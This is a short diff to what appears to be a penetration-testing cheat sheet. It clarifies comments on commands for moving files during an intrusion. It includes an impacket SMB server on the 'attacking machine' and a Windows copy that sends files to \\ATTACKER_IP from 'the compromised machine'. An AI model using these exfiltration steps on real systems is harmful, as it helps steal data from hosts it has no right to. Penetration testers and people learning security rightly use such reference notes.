@@ -48,8 +48,8 @@ scp file.txt remote_username@10.10.0.2:/remote/directory || send file file.txt
 ```
 Download/Send files through SMB using Python impacket
 ```
-python3.9 /opt/smbserver.py -smb2support -username <username> -password <password> public share || make a "share" folder first
-copy C:\Path\To\file.txt \\ATTACKER_IP\public\
+python3.9 /opt/smbserver.py -smb2support -username <username> -password <password> public share || make a "share" folder first on the attacking machine
+copy C:\Path\To\file.txt \\ATTACKER_IP\public\ || send the files from the compromised machine
 
 ```
 Grep
